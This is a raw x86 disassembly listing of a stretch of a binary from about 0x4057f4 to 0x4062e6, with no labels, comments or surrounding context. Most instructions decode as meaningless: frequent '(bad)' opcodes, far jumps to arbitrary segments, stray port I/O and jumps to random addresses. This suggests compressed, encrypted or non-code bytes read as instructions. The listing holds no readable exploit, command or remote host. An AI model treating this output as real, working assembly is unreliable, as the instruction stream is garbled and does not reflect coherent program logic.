  4057f4:	bound  ebp,QWORD PTR [ebx-0x33a3901a]
  4057fa:	lea    ecx,[ebx]
  4057fc:	shl    DWORD PTR [edi-0x362990d1],1
  405802:	mov    bl,0x67
  405804:	shr    DWORD PTR [ebx],0x2
  405807:	pop    esp
  405808:	jmp    0xbe9fdb89
  40580d:	dec    edi
  40580e:	push   ss
  40580f:	fucomip st,st(1)
  405811:	fist   DWORD PTR [esp+ebp*2-0x16fe3652]
  405818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405819:	(bad)  
  40581b:	sbb    DWORD PTR [esi+0x329ac5c9],0xffffffbb
  405822:	cld    
  405823:	arpl   cx,bp
  405825:	cs mov ch,0x7f
  405828:	push   ds
  405829:	jge    0x40582b
	...
  405853:	add    BYTE PTR [ebx+0x63],bl
  405856:	xchg   edx,eax
  405857:	repz push 0x4bef0082
  40585d:	push   ss
  40585e:	add    DWORD PTR [ecx+0x3f],esp
  405861:	push   ss
  405862:	and    BYTE PTR [esi],0x42
  405865:	call   0x16b7175e
  40586a:	adc    BYTE PTR [esi],0x62
  40586d:	out    0xe9,eax
  40586f:	imul   esi,DWORD PTR [edi],0xc24c7460
  405875:	or     dh,BYTE PTR cs:[ebp-0x1fc02463]
  40587c:	stc    
  40587d:	xchg   ecx,eax
  40587e:	mov    ebp,DWORD PTR [ebp+eax*4-0x6a0e8a93]
  405885:	jae    0x405862
  405887:	jmp    0xea3932c9
  40588c:	(bad)  
  40588e:	or     BYTE PTR [ebp+0x7d206e35],0x68
  405895:	out    dx,al
  405896:	jnp    0x405859
  405898:	xchg   BYTE PTR [eax+0x74],ah
  40589b:	out    0xbd,eax
  40589d:	out    dx,eax
  40589e:	aaa    
  40589f:	out    dx,al
  4058a0:	inc    ebx
  4058a1:	jmp    0xf0ff:0x33816906
  4058a8:	adc    BYTE PTR [esi-0x3a],0x2d
  4058ac:	cmp    ch,BYTE PTR [esi+0x0]
  4058af:	ret    0x823b
  4058b2:	add    dl,dl
  4058b4:	ror    DWORD PTR ds:0xabc9,1
	...
  4058e2:	adc    DWORD PTR [esi+0x54],ebp
  4058e5:	(bad)  
  4058e7:	fld    st(4)
  4058e9:	lds    ecx,FWORD PTR [edx-0x26]
  4058ec:	cmp    eax,0x1c3a7c
  4058f1:	jmp    0xd4c3a277
  4058f6:	push   esp
  4058f7:	and    al,BYTE PTR [ecx-0x17]
  4058fa:	cmp    eax,0x640008e7
  4058ff:	push   ebp
  405900:	or     DWORD PTR [ebx+0x26],0xd8750057
  405907:	dec    esi
  405908:	rcr    BYTE PTR [ebx-0x62],0x97
  40590c:	or     BYTE PTR [eax],al
  40590e:	dec    esp
  40590f:	rol    bh,0x45
  405912:	or     ebx,DWORD PTR [edx+0x0]
  405915:	add    BYTE PTR [edi-0x1807bb1c],dl
  40591b:	mov    ds:0x596d0875,al
  405920:	call   DWORD PTR ds:0x412eea
  405926:	pushf  
  405927:	cdq    
  405928:	je     0x405985
  40592a:	call   DWORD PTR [eax-0x1198ff25]
  405930:	iret   
  405931:	lea    ebx,[edx+0x776a509d]
  405937:	daa    
  405938:	call   DWORD PTR ds:0x412ed6
  40593e:	dec    esp
  40593f:	cdq    
  405940:	je     0x40596b
  405942:	sbb    BYTE PTR ds:0x1e4,ch
	...
  405970:	push   edi
  405971:	pop    ecx
  405972:	add    bh,bh
  405974:	retf   0x8fa1
  405977:	inc    ebp
  405978:	setne  BYTE PTR [ebp-0x4]
  40597c:	mov    al,ds:0x9283ec1a
  405981:	jae    0x405982
  405983:	jae    0x4059a3
  405985:	scas   al,BYTE PTR es:[edi]
  405986:	inc    ebp
  405987:	lock and eax,0xec000059
  40598d:	ins    BYTE PTR es:[edi],dx
  40598e:	mov    BYTE PTR [ebp-0x39],0x57
  405992:	add    BYTE PTR [eax],al
  405994:	pop    ss
  405995:	adc    eax,DWORD PTR [eax]
  405997:	push   0xffffffe7
  405999:	adc    dl,BYTE PTR [eax]
  40599b:	lea    ebx,[edx]
  40599d:	jnp    0x4059ef
  40599f:	push   0x3e
  4059a1:	add    dh,0x75
  4059a4:	jmp    0x443:0x8598f1dd
  4059ab:	or     edi,esi
  4059ad:	data16 add al,0x43
  4059b0:	mov    ebp,0x4a00cf67
  4059b5:	jp     0x40597d
  4059b7:	jne    0x40596b
  4059b9:	or     bh,cl
  4059bb:	fidivr DWORD PTR [esi]
  4059bd:	cmp    BYTE PTR [edx-0x3d],0x5
  4059c1:	cmp    eax,edx
  4059c3:	or     BYTE PTR [esi],bh
  4059c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059c6:	jp     0x4059b4
  4059c8:	cdq    
  4059c9:	scas   eax,DWORD PTR es:[edi]
  4059ca:	sti    
  4059cb:	out    0x39,eax
  4059cd:	cmp    DWORD PTR [eax+eax*1],eax
  4059d0:	(bad)  
  4059d1:	rcr    ebx,1
  4059d3:	inc    ecx
	...
  4059fc:	add    BYTE PTR [eax],al
  4059fe:	mov    ?,WORD PTR ds:0xcf7950c7
  405a04:	sti    
  405a05:	dec    edi
  405a06:	data16 data16 stos BYTE PTR es:[edi],al
  405a09:	add    BYTE PTR [esi],bh
  405a0b:	stos   BYTE PTR es:[edi],al
  405a0c:	mov    esp,0x30823ac2
  405a11:	mov    ebp,DWORD PTR [edx+0x1]
  405a14:	sar    ah,0xed
  405a17:	add    BYTE PTR [ecx+0x8],cl
  405a1a:	ds out dx,eax
  405a1c:	std    
  405a1d:	sub    bh,BYTE PTR [esi-0x37]
  405a20:	mov    esp,0x1a8246c2
  405a25:	(bad)  [edx+eax*4-0x7d6bffa7]
  405a2c:	pop    ecx
  405a2d:	add    BYTE PTR [ecx],ah
  405a2f:	pop    es
  405a30:	clc    
  405a31:	(bad)  
  405a32:	xchg   ebx,eax
  405a33:	push   0x59
  405a35:	add    BYTE PTR [edx+eax*4-0x7e1ac925],ah
  405a3c:	add    ecx,DWORD PTR [ebx]
  405a3e:	(bad)  
  405a3f:	and    eax,0x5b838910
  405a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a45:	(bad)  
  405a46:	imul   ebp,DWORD PTR [edi-0x6f],0xffffffcd
  405a4a:	fldcw  WORD PTR [ebx-0x6a]
  405a4d:	cli    
  405a4e:	mov    eax,ds:0xf67ac3e6
  405a53:	add    cl,ch
  405a55:	pop    ecx
  405a56:	ds ins BYTE PTR es:[edi],dx
  405a58:	hlt    
  405a59:	(bad)  
  405a5a:	ins    DWORD PTR es:[edi],dx
  405a5b:	ins    BYTE PTR es:[edi],dx
  405a5c:	cld    
  405a5d:	test   eax,0x59e0e5
	...
  405a8b:	add    BYTE PTR [esi],bh
  405a8d:	add    ecx,ebp
  405a8f:	fild   DWORD PTR [eax+edx*4-0x17]
  405a93:	add    esi,DWORD PTR ds:0xcfbdc9b
  405a99:	adc    DWORD PTR [ecx+0x126b99d6],0xffffffab
  405aa0:	lds    edx,FWORD PTR [edi+0x627cbca2]
  405aa6:	jmp    0xc3bf0fdb
  405aab:	(bad)  
  405aac:	jns    0x405a93
  405aae:	lock fstp TBYTE PTR [ecx+0x77c61e6b]
  405ab5:	cwde   
  405ab6:	in     eax,dx
  405ab7:	add    ecx,DWORD PTR [ebx]
  405ab9:	loopne 0x405ab8
  405abb:	sbb    ebx,0x384fe95e
  405ac1:	fdivr  DWORD PTR [ebx+edi*8+0x49]
  405ac5:	out    0xee,al
  405ac7:	sbb    bh,BYTE PTR [esi-0x5f]
  405aca:	sub    edi,ebx
  405acc:	cmp    ebp,esi
  405ace:	call   0xde980697
  405ad3:	dec    edi
  405ad4:	ss jae 0x405a86
  405ad7:	test   eax,0xc3e25b3e
  405adc:	xchg   edx,eax
  405add:	dec    ebx
  405ade:	cwde   
  405adf:	push   edi
  405ae0:	inc    edx
  405ae1:	push   0x34
  405ae3:	clc    
  405ae4:	or     cl,dh
  405ae6:	jmp    eax
  405ae8:	in     eax,0x1a
  405aea:	jmp    FWORD PTR [esi+0x72187703]
	...
  405b18:	add    BYTE PTR [eax],al
  405b1a:	xor    DWORD PTR [edi+0x40],edx
  405b1d:	cmp    DWORD PTR [edx],ecx
  405b1f:	icebp  
  405b20:	out    dx,al
  405b21:	xchg   esi,eax
  405b22:	sti    
  405b23:	or     edi,edi
  405b25:	adc    al,0xd6
  405b27:	sbb    bh,bh
  405b29:	cld    
  405b2a:	aad    0x82
  405b2c:	lahf   
  405b2d:	mov    es,WORD PTR [ebx]
  405b2f:	imul   ebx,DWORD PTR [eax-0x60],0xfffffffc
  405b33:	push   ebx
  405b34:	add    BYTE PTR [edi+esi*1],dl
  405b37:	ja     0x405b8f
  405b39:	mov    esi,0xf17dde6e
  405b3e:	cmp    eax,0x7a0208f0
  405b43:	push   es
  405b44:	pop    edi
  405b45:	scas   eax,DWORD PTR es:[edi]
  405b46:	aam    0x9d
  405b48:	or     cl,ch
  405b4a:	push   ss
  405b4b:	and    BYTE PTR [edx+ebp*2],cl
  405b4e:	mov    ds:0xee290b5c,al
  405b53:	push   ebx
  405b54:	sub    ebp,DWORD PTR [ecx]
  405b56:	daa    
  405b57:	or     bl,BYTE PTR [esi+0x30]
  405b5a:	jl     0x405baf
  405b5c:	add    BYTE PTR [edx+0x21],dh
  405b5f:	push   edi
  405b60:	mov    ebx,DWORD PTR [ebp+eiz*2+0x702fed5]
  405b67:	add    DWORD PTR [ebx+0x3067bdef],ecx
  405b6d:	jnp    0x405bb6
  405b6f:	jmp    0xfd80:0x5ff2b0fb
  405b76:	dec    ebp
  405b77:	jbe    0x405ba6
  405b79:	imul   edi,ecx,0xec721b
	...
  405ba7:	add    BYTE PTR [ebp+0x225e4666],bh
  405bad:	jmp    0xa:0x9ec228eb
  405bb4:	in     al,dx
  405bb5:	jb     0x405c36
  405bb7:	cld    
  405bb8:	jbe    0x405bc7
  405bba:	or     eax,0x7707cb80
  405bbf:	or     BYTE PTR [edi-0x6e],ah
  405bc2:	popa   
  405bc3:	and    BYTE PTR [ebx+0xc09ea63],0x9e
  405bca:	pop    ebx
  405bcb:	pop    edi
  405bcc:	sub    DWORD PTR [esi+0x61e708c2],esp
  405bd2:	xor    BYTE PTR [edx-0x31],dh
  405bd5:	popa   
  405bd6:	cmp    DWORD PTR [edi-0x1d],esi
  405bd9:	push   ecx
  405bda:	xor    bl,ch
  405bdc:	repnz popa 
  405bde:	inc    ecx
  405bdf:	jb     0x405b7e
  405be1:	popa   
  405be2:	inc    esi
  405be3:	ja     0x405b86
  405be5:	push   ecx
  405be6:	inc    ecx
  405be7:	add    al,0xad
  405be9:	adc    BYTE PTR [edi],0x3c
  405bec:	jbe    0x405bf9
  405bee:	or     bh,BYTE PTR [ecx+eax*4]
  405bf1:	push   ss
  405bf2:	push   es
  405bf3:	sub    al,0x86
  405bf5:	imul   ecx,DWORD PTR [ecx],0xc0428eeb
  405bfb:	pop    ebx
  405bfc:	test   al,0x3f
  405bfe:	leave  
  405bff:	ret    0x5d5f
  405c02:	shl    al,0x63
  405c05:	arpl   bx,ax
  405c07:	stos   BYTE PTR es:[edi],al
  405c08:	lods   al,BYTE PTR ds:[esi]
  405c09:	and    al,BYTE PTR [ebx+0xc6]
	...
  405c33:	add    BYTE PTR [eax],al
  405c35:	add    BYTE PTR [ebp+0x62],dl
  405c38:	fidiv  DWORD PTR [ebp-0x1a]
  405c3b:	aad    0x1
  405c3d:	add    BYTE PTR [edi+0x5d],ah
  405c40:	pop    ebx
  405c41:	pop    edi
  405c42:	test   eax,0x5708c2a4
  405c47:	ss push ebx
  405c49:	push   eax
  405c4a:	iret   
  405c4b:	add    al,0x1f
  405c4d:	sub    ah,BYTE PTR [edi+0x5f]
  405c50:	clc    
  405c51:	jb     0x405c69
  405c53:	mov    ds:0x733ebbff,al
  405c58:	add    eax,DWORD PTR [eax]
  405c5a:	fld    DWORD PTR ds:[esi+0x2d727f4d]
  405c61:	add    DWORD PTR [ecx-0x76],esi
  405c64:	inc    edx
  405c65:	std    
  405c66:	add    DWORD PTR [edx+0x65fad7e7],esi
  405c6c:	ret    
  405c6d:	mov    ecx,0xffc3c1f1
  405c72:	in     al,dx
  405c73:	sbb    ah,bh
  405c75:	push   es
  405c76:	imul   ebx,edx,0xffffff8f
  405c79:	ret    
  405c7a:	jne    0x405cb5
  405c7c:	(bad)  
  405c7d:	push   ebp
  405c7e:	(bad)
  405c81:	(bad)  
  405c82:	into   
  405c83:	inc    ebp
  405c84:	push   esp
  405c85:	pop    eax
  405c86:	push   esi
  405c87:	dec    ebx
  405c88:	out    dx,al
  405c89:	aas    
  405c8a:	ds jmp 0x3d87:0x17d0135
  405c92:	mov    edi,0x3e0044ad
  405c97:	xchg   BYTE PTR ds:0x83,dl
	...
  405cc1:	add    BYTE PTR [eax],al
  405cc3:	add    BYTE PTR [ebx-0x5],bl
  405cc6:	dec    esi
  405cc7:	inc    ecx
  405cc8:	ds jb  0x405d02
  405ccb:	or     DWORD PTR [ebp-0xb46f99],edi
  405cd1:	jno    0x405cd6
  405cd3:	jne    0x405d18
  405cd5:	pop    ebp
  405cd6:	les    ebx,FWORD PTR [ebx-0x79]
  405cd9:	xor    eax,0xd456daef
  405cde:	fadd   QWORD PTR [eax]
  405ce0:	call   FWORD PTR ds:[eax-0x4]
  405ce4:	in     al,dx
  405ce5:	fisttp DWORD PTR [ebx]
  405ce7:	push   eax
  405ce8:	push   ecx
  405ce9:	xchg   DWORD PTR [ebx+ecx*2-0x3ff18e01],eax
  405cf0:	xor    esi,esi
  405cf2:	xchg   ebx,eax
  405cf3:	add    BYTE PTR [esi],bh
  405cf5:	jb     0x405cc1
  405cf7:	inc    ebp
  405cf8:	ss pop ebx
  405cfa:	jmp    0x6c9b9b02
  405cff:	dec    eax
  405d00:	or     eax,DWORD PTR es:[ebx+0x4]
  405d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d05:	pop    ebx
  405d06:	inc    ebx
  405d07:	add    eax,0xc2c4ee11
  405d0c:	xor    edx,edx
  405d0e:	xor    al,BYTE PTR [ebp+0x3e]
  405d11:	push   esp
  405d12:	test   eax,0xf7736438
  405d17:	fdivr  QWORD PTR [esi]
  405d19:	pop    ebx
  405d1a:	push   0xffffffbb
  405d1c:	fs out dx,al
  405d1e:	or     BYTE PTR [edi+0x37e96363],al
  405d24:	je     0x405d8e
  405d26:	adc    al,0xbc
	...
  405d50:	add    BYTE PTR [eax],al
  405d52:	out    0x76,al
  405d54:	xchg   esp,eax
  405d55:	ret    0xd1c9
  405d58:	and    al,0xb8
  405d5a:	mov    bl,0x1d
  405d5c:	jno    0x405db1
  405d5e:	mov    ecx,0x2bc270ed
  405d63:	outs   dx,DWORD PTR ds:[esi]
  405d64:	rol    DWORD PTR [ecx+ebp*4],cl
  405d67:	in     eax,dx
  405d68:	pop    esp
  405d69:	ret    0xd24b
  405d6c:	mov    ds:0x29543e44,al
  405d71:	aaa    
  405d72:	pusha  
  405d73:	aam    0xac
  405d75:	mov    bh,0xb5
  405d77:	dec    edx
  405d78:	ins    BYTE PTR es:[edi],dx
  405d79:	dec    eax
  405d7a:	mov    cs,WORD PTR [edx]
  405d7c:	fwait
  405d7d:	ret    0xd653
  405d80:	mov    ds:0x29543e44,al
  405d85:	aaa    
  405d86:	inc    esp
  405d87:	repz xchg ebx,eax
  405d89:	push   eax
  405d8a:	call   FWORD PTR [edx+0x16]
  405d8d:	cmp    BYTE PTR [esi+0x72],cl
  405d90:	std    
  405d91:	fidivr DWORD PTR [esi]
  405d93:	pop    ebx
  405d94:	bnd ret 
  405d96:	rcr    DWORD PTR [ecx-0x56],cl
  405d99:	ret    0x6acb
  405d9c:	add    BYTE PTR [ecx],al
  405d9e:	jo     0x405d23
  405da0:	add    cl,ch
  405da2:	cld    
  405da3:	lock repz rol ebx,1
  405da7:	js     0x405da8
  405da9:	fdivp  st(7),st
  405dab:	lock sti 
  405dad:	rol    DWORD PTR [ecx-0x3d16ff7d],0x9a
  405db4:	pop    ebx
  405db5:	mov    al,0x0
	...
  405ddf:	add    BYTE PTR [ebx],al
  405de1:	adc    DWORD PTR [ebx-0x3f604233],ecx
  405de7:	mov    bh,0xff
  405de9:	push   bx
  405deb:	sbb    DWORD PTR [edx+0x7dd23ff3],edx
  405df1:	pop    ebx
  405df2:	clc    
  405df3:	sbb    edi,DWORD PTR ds:0xd96aff9a
  405df9:	pop    ds
  405dfa:	dec    ebx
  405dfb:	sub    BYTE PTR [edx],bh
  405dfd:	pop    ebx
  405dfe:	je     0x405de2
  405e00:	ret    0x4928
  405e03:	xor    bh,BYTE PTR [ebp+0x5b]
  405e06:	add    ch,bh
  405e08:	push   ebx
  405e09:	fidivr DWORD PTR ds:0x1c0368
  405e0f:	jmp    0x1cc3b285
  405e14:	mov    ecx,0x3de94112
  405e19:	lock add al,0x2
  405e1c:	jp     0x405e20
  405e1e:	leave  
  405e1f:	sub    bl,BYTE PTR [ebx-0x72b007f]
  405e25:	adc    DWORD PTR [ecx-0x17],eax
  405e28:	les    esp,FWORD PTR [eax]
  405e2a:	hlt    
  405e2b:	es mov ecx,0x7f26fe97
  405e31:	xor    eax,DWORD PTR [ecx]
  405e33:	jmp    0x83404f75
  405e38:	inc    ebx
  405e39:	jae    0x405eae
  405e3b:	xor    DWORD PTR [edx],edi
  405e3d:	pop    ebx
  405e3e:	add    DWORD PTR [eax],0x3f
  405e41:	pushf  
  405e42:	je     0x405e48
	...
  405e6c:	add    BYTE PTR [eax],al
  405e6e:	popa   
  405e6f:	pop    ecx
  405e70:	add    BYTE PTR [eax],al
  405e72:	sahf   
  405e73:	fmulp  st(0),st
  405e75:	(bad)  
  405e76:	and    BYTE PTR [ebx-0x640c7a73],bl
  405e7c:	(bad)  
  405e7d:	jmp    DWORD PTR [edi-0x64]
  405e80:	mov    ch,0xc8
  405e82:	icebp  
  405e83:	call   0x0:0x874fe8ff
  405e8a:	or     al,0x9a
  405e8c:	je     0x40b856
  405e92:	jg     0x405ecb
  405e94:	dec    ebp
  405e95:	inc    ecx
  405e96:	out    0xd4,eax
  405e98:	test   eax,esi
  405e9a:	mov    eax,ds:0xcf50ff9a
  405e9f:	push   cs
  405ea0:	fld    DWORD PTR [eax]
  405ea2:	out    0x56,eax
  405ea4:	ror    BYTE PTR [edi],0x5b
  405ea7:	lahf   
  405ea8:	add    BYTE PTR [eax],al
  405eaa:	xlat   BYTE PTR ds:[ebx]
  405eab:	xchg   edx,eax
  405eac:	test   esp,eax
  405eae:	inc    ecx
  405eaf:	fwait
  405eb0:	inc    DWORD PTR [eax]
  405eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb3:	pop    ecx
  405eb4:	add    BYTE PTR [ebp-0x161e6],cl
  405eba:	and    BYTE PTR [edx],cl
  405ebc:	push   DWORD PTR [ebp-0x6395]
  405ec2:	lock dec esp
  405ec4:	dec    ecx
  405ec5:	dec    ebx
  405ec6:	out    0x59,al
  405ec8:	mov    edx,DWORD PTR [ebp-0x63a5]
  405ece:	mov    WORD PTR [ecx+0x840f],ds
	...
  405efc:	cvtps2pd xmm0,QWORD PTR [eax]
  405eff:	add    BYTE PTR [esp+ecx*1-0xc],ch
  405f03:	pminub mm1,mm2
  405f06:	add    BYTE PTR [eax],al
  405f08:	push   edi
  405f09:	call   0xffc0:0x4e3ed4b5
  405f10:	in     al,0x73
  405f12:	sub    eax,DWORD PTR [eax]
  405f14:	ds je  0x405f1c
  405f17:	call   0x43ab65
  405f1c:	inc    ebp
  405f1d:	xor    dh,BYTE PTR [edi]
  405f1f:	jns    0x405ee8
  405f21:	mov    edi,0x7e838dbb
  405f26:	push   esp
  405f27:	push   0x17415
  405f2c:	sbb    DWORD PTR [eax],ecx
  405f2e:	mov    esp,0x4af32bff
  405f33:	inc    ecx
  405f34:	ds imul eax,ebx,0x39a56674
  405f3b:	cld    
  405f3c:	stc    
  405f3d:	xchg   DWORD PTR [eax+0xa727f4b],ecx
  405f43:	shl    BYTE PTR [edx+0x7b],0x42
  405f47:	(bad)  
  405f48:	mov    ebx,0xd9ffbeb2
  405f4d:	jb     0x405f52
  405f4f:	add    BYTE PTR [esi],bh
  405f51:	pop    es
  405f52:	mov    eax,eax
  405f54:	enter  0xbfdd,0x50
  405f58:	push   esi
  405f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f5a:	add    ecx,DWORD PTR [edi]
  405f5c:	ficomp DWORD PTR ds:[ebx+0xd8]
	...
  405f87:	add    BYTE PTR [eax],al
  405f89:	add    BYTE PTR [esi],bh
  405f8b:	jb     0x405f97
  405f8d:	shl    BYTE PTR [ebx],0x67
  405f90:	cmp    BYTE PTR [ebp-0x40fb82],0x3e
  405f97:	xchg   BYTE PTR [edi],cl
  405f99:	dec    ebx
  405f9b:	xor    bh,BYTE PTR [esi+0x8ed89ff]
  405fa1:	ret    
  405fa2:	div    BYTE PTR [edx+0x192deb03]
  405fa8:	sbb    bh,bh
  405faa:	jmp    0x405fe1
  405fac:	lods   al,BYTE PTR ds:[esi]
  405fad:	lock nop
  405faf:	pop    ebx
  405fb0:	jmp    0x212ec0b8
  405fb5:	lods   al,BYTE PTR ds:[esi]
  405fb6:	data16 (bad) 
  405fb8:	jmp    0xe93c4c0
  405fbd:	cmp    DWORD PTR [esi+0x73],eax
  405fc0:	daa    
  405fc1:	(bad)  
  405fc2:	ds pop ebx
  405fc4:	ins    BYTE PTR es:[edi],dx
  405fc5:	mov    DWORD PTR [edx],ecx
  405fc7:	idiv   BYTE PTR gs:[esi-0x33cb9b72]
  405fce:	sub    BYTE PTR [esi+eiz*8-0x55],ah
  405fd2:	nop
  405fd3:	mov    ecx,gs
  405fd5:	add    esp,DWORD PTR [edi]
  405fd7:	pop    esi
  405fd8:	(bad)  
  405fd9:	mov    esi,0xcb946411
  405fde:	or     BYTE PTR [esi+eax*8-0x55],ah
  405fe2:	ret    0xe98c
  405fe5:	add    eax,ebp
  405fe7:	xchg   edi,eax
  405fe8:	adc    cl,ch
  405fea:	std    
  405feb:	or     eax,0xaf62
	...
  406018:	mov    ebp,0x8d53959e
  40601d:	or     bh,BYTE PTR [ebx]
  40601f:	push   edi
  406020:	jo     0x405ff2
  406022:	sub    al,0x10
  406024:	ret    
  406025:	shr    BYTE PTR [ecx+0x3],cl
  406028:	ds pop ebx
  40602a:	je     0x406043
  40602c:	sti    
  40602d:	pop    edx
  40602e:	jmp    0x92109e36
  406033:	mov    al,BYTE PTR [esi-0x48fa7e67]
  406039:	sbb    eax,0x53238a55
  40603e:	jmp    0x9d82:0x695b80bc
  406045:	and    eax,DWORD PTR [edx]
  406047:	mov    ebx,0x32015fbd
  40604c:	xor    BYTE PTR [eax+0x42],bl
  40604f:	jnp    0x40604f
  406051:	pop    edx
  406052:	add    cl,ch
  406054:	cmp    eax,0xa5eac330
  406059:	arpl   WORD PTR [ebp+0x15],ax
  40605c:	mov    dl,0xb
  40605e:	cmp    BYTE PTR [esi+edx*1+0x6b],ch
  406062:	(bad)  
  406063:	out    dx,eax
  406064:	cmp    bh,BYTE PTR [eax]
  406066:	inc    ebp
  406067:	xchg   BYTE PTR [eax-0x2b8ffbe4],al
  40606d:	xchg   ebp,eax
  40606e:	out    dx,eax
  40606f:	adc    DWORD PTR es:[ebx-0x2],0x15
  406074:	mov    bh,0xc3
  406076:	(bad)  
  406077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406078:	cmp    ecx,ebp
  40607a:	push   ebx
  40607b:	sbb    eax,DWORD PTR [eax]
	...
  4060a5:	add    BYTE PTR [edx+0x62],cl
  4060a8:	jne    0x406077
  4060aa:	fucomi st,st(0)
  4060ac:	pop    es
  4060ad:	fs jns 0x40611b
  4060b0:	push   eax
  4060b1:	shl    DWORD PTR [ecx],0x5b
  4060b4:	add    cl,ch
  4060b6:	shl    DWORD PTR [esp+eax*1-0x74a4c217],0x34
  4060be:	dec    edx
  4060bf:	outs   dx,BYTE PTR ds:[esi]
  4060c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060c1:	jnp    0x8282b9cc
  4060c7:	xchg   esp,eax
  4060c8:	ret    0x3ded
  4060cb:	or     BYTE PTR [ebx-0x368407b],cl
  4060d1:	aaa    
  4060d2:	jae    0x4060df
  4060d4:	push   ebx
  4060d5:	sbb    BYTE PTR [esi+edx*8+0x75],ch
  4060d9:	in     eax,dx
  4060da:	(bad)  
  4060db:	loopne 0x4060e4
  4060dd:	(bad)  
  4060de:	stc    
  4060df:	dec    edx
  4060e0:	mov    DWORD PTR [esi+edi*2],esp
  4060e3:	(bad)  
  4060e4:	pop    es
  4060e5:	jb     0x4060ea
  4060e7:	push   edi
  4060e8:	mov    ebp,DWORD PTR [esi-0x1aa829bb]
  4060ee:	(bad)  
  4060ef:	xor    edx,DWORD PTR fs:[ebx-0x61]
  4060f3:	xor    eax,DWORD PTR gs:[eax]
  4060f6:	std    
  4060f7:	rol    DWORD PTR [edi+eax*1-0x28960581],1
  4060fe:	fs pop eax
  406100:	rol    eax,0x60
  406103:	pop    ebx
  406104:	ret    
  406105:	mov    ebx,DWORD PTR [esp+ebp*2]
  406108:	clc    
  406109:	and    eax,DWORD PTR [eax]
	...
  406133:	add    BYTE PTR [edi],bl
  406135:	ins    BYTE PTR es:[edi],dx
  406136:	clc    
  406137:	(bad)  
  406138:	rol    DWORD PTR [edi+0x56],cl
  40613b:	mov    bh,0x20
  40613d:	scas   eax,DWORD PTR es:[edi]
  40613e:	add    edx,DWORD PTR [esi+0x53]
  406141:	popf   
  406142:	ret    0x240c
  406145:	mov    cs,WORD PTR [ebx+0x23a2f4f8]
  40614b:	cli    
  40614c:	in     al,0xa2
  40614e:	lea    ecx,[eax+ebp*1+0x43207083]
  406155:	pop    esp
  406156:	dec    esi
  406157:	or     dh,ah
  406159:	pushf  
  40615a:	adc    DWORD PTR [ebx],eax
  40615c:	fst    st(2)
  40615e:	cli    
  40615f:	xor    edi,edi
  406161:	jp     0x40615b
  406163:	xor    edi,edi
  406165:	rcr    BYTE PTR [edi+ebx*1-0x3e427007],1
  40616c:	aam    0xff
  40616e:	or     eax,ecx
  406170:	xchg   esp,eax
  406171:	inc    edi
  406172:	add    ebx,ecx
  406174:	dec    esp
  406175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406176:	xor    edi,edx
  406178:	add    al,0xa3
  40617a:	xor    edi,edx
  40617c:	push   0xffffffda
  40617e:	pop    es
  40617f:	scas   eax,DWORD PTR es:[edi]
  406180:	enter  0xf521,0x3
  406184:	popa   
  406185:	inc    edi
  406186:	rol    eax,0xa0
  406189:	pop    edx
  40618a:	ret    
  40618b:	mov    ebp,DWORD PTR [ebx+ebp*2]
  40618e:	clc    
  40618f:	and    ebx,DWORD PTR [edi]
  406191:	imul   edi,eax,0xffffff8d
  406194:	adc    eax,DWORD PTR [edi+0x2a]
  406197:	mov    BYTE PTR [eax],0x0
	...
  4061c2:	ds icebp 
  4061c4:	inc    ebx
  4061c5:	add    esi,eax
  4061c7:	addr16 ret 0x32c2
  4061cb:	jne    0x4061a0
  4061cd:	mov    esi,DWORD PTR [esi+0x64]
  4061d0:	mov    eax,0xb8647423
  4061d5:	lea    edi,[edx+0x2e461080]
  4061db:	or     al,0x0
  4061dd:	dec    esi
  4061de:	ss xor eax,edx
  4061e1:	adc    DWORD PTR ds:0xdfa883e,edi
  4061e7:	dec    esp
  4061e8:	loopne 0x4061e2
  4061ea:	or     eax,0x599c8e5c
  4061ef:	jae    0x406187
  4061f1:	inc    esi
  4061f2:	xor    esi,DWORD PTR [esi+0x5d]
  4061f5:	sbb    al,0xff
  4061f7:	xor    eax,0xee070315
  4061fc:	mov    esp,0xbf561433
  406201:	xor    edx,DWORD PTR [eax+edi*8]
  406204:	jg     0x40620d
  406206:	out    0xea,al
  406208:	sub    DWORD PTR [ecx+0x3d],0x30
  40620c:	in     al,0xc0
  40620e:	(bad)  
  40620f:	jns    0x406217
  406211:	ret    
  406212:	lds    ebp,FWORD PTR [ebp-0x55e20709]
  406218:	idiv   eax
  40621a:	mov    bl,0xde
  40621c:	adc    ch,BYTE PTR [edi+0x38f36d1]
  406222:	push   0xc2c48e
	...
  40624f:	add    BYTE PTR [edx],bh
  406251:	jne    0x406226
  406253:	mov    eax,esi
  406255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406256:	mov    esi,0xbea5b423
  40625b:	(bad)  
  40625c:	ret    0x7479
  40625f:	pop    ebx
  406260:	test   eax,0x564e06f1
  406265:	pop    ebx
  406266:	sub    ch,al
  406268:	das    
  406269:	pop    esp
  40626a:	xor    ecx,DWORD PTR [edi-0x18aed36c]
  406270:	xchg   BYTE PTR [ecx+edx*2],ch
  406273:	mov    DWORD PTR [edx+0x1ad38740],esp
  406279:	shr    dl,cl
  40627b:	pop    ecx
  40627c:	and    bl,BYTE PTR [edx-0x7dc2edd6]
  406282:	bound  edi,QWORD PTR [ebp-0x41359ad3]
  406288:	or     eax,0x39806c65
  40628d:	cmp    eax,0x5bd593f8
  406292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406293:	repz jle 0x406231
  406296:	out    dx,al
  406297:	push   es
  406298:	std    
  406299:	rol    DWORD PTR [edx],cl
  40629b:	div    DWORD PTR [esi]
  40629d:	cmp    al,0xf1
  40629f:	mul    BYTE PTR [esi]
  4062a1:	into   
  4062a2:	push   ebp
  4062a3:	adc    ecx,ebp
  4062a5:	jmp    0x97e1b2a
  4062aa:	adc    eax,0xea4efcc5
  4062af:	shl    DWORD PTR [ebp+0xbf1a62],cl
	...
  4062dd:	add    BYTE PTR [ebp+0x65],bl
  4062e0:	cli    
  4062e1:	mov    esi,0x89eececb
  4062e6:	jge    0x4062ca
